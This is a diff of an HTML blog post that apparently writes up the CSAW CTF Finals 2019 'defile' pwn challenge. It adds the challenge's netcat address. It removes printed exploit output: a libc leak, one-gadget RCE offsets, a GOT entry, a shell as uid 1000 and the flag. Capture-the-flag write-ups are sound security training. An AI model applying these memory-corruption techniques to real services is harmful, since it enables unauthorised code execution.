@@ -21,7 +21,7 @@
 &lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
 &lt;blockquote&gt;
 &lt;p&gt;wild handlock main btw&lt;/p&gt;
-&lt;p&gt;nc host port&lt;/p&gt;
+&lt;p&gt;nc pwn.chal.csaw.io 1004&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h3 id=&#34;attachments&#34;&gt;Attachments&lt;/h3&gt;
 &lt;blockquote&gt;
@@ -156,25 +156,7 @@ if __name__ == &amp;quot;__main__&amp;quot;:
 exploit()
 &lt;/code&gt;&lt;/pre&gt;
 &lt;h4 id=&#34;running-the-exploit&#34;&gt;Running the exploit&lt;/h4&gt;
-&lt;pre&gt;&lt;code class=&#34;language-none&#34;&gt;python exploit_defile.py
-[*] &#39;/home/philomath213/CSAW19_Finals/pwn/defile/libc.so.6&#39;
-Arch: amd64-64-little
-RELRO: Partial RELRO
-Stack: Canary found
-NX: NX enabled
-PIE: PIE enabled
-[*] stdout_libc: 0x003ec760
-[*] one gadget RCE offsets: [324293, 324386, 1090444]
-[+] Opening connection to pwn.chal.csaw.io on port 1004: Done
-[*] stdout: 0x7f0fad3a8760
-[*] libc_base: 0x7f0facfbc000
-[*] got_entry: 0x7f0fad3a70a8
-[*] one_gadget: 0x7f0fad0c638c
-[+] Receiving all data: Done (88B)
-[*] Closed connection to pwn.chal.csaw.io port 1004
-[+] uid=1000(defile) gid=1000(defile) groups=1000(defile)
-flag{me_you_in_room_1337_tonight}
-&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://philomath213.github.io/post/CSAW-CTF-Finals-2019-defile/screenshot1.png&#34; alt=&#34;screenshot1&#34; /&gt;&lt;/p&gt;
 &lt;h4 id=&#34;flag&#34;&gt;Flag&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p&gt;flag{me_you_in_room_1337_tonight}&lt;/p&gt;
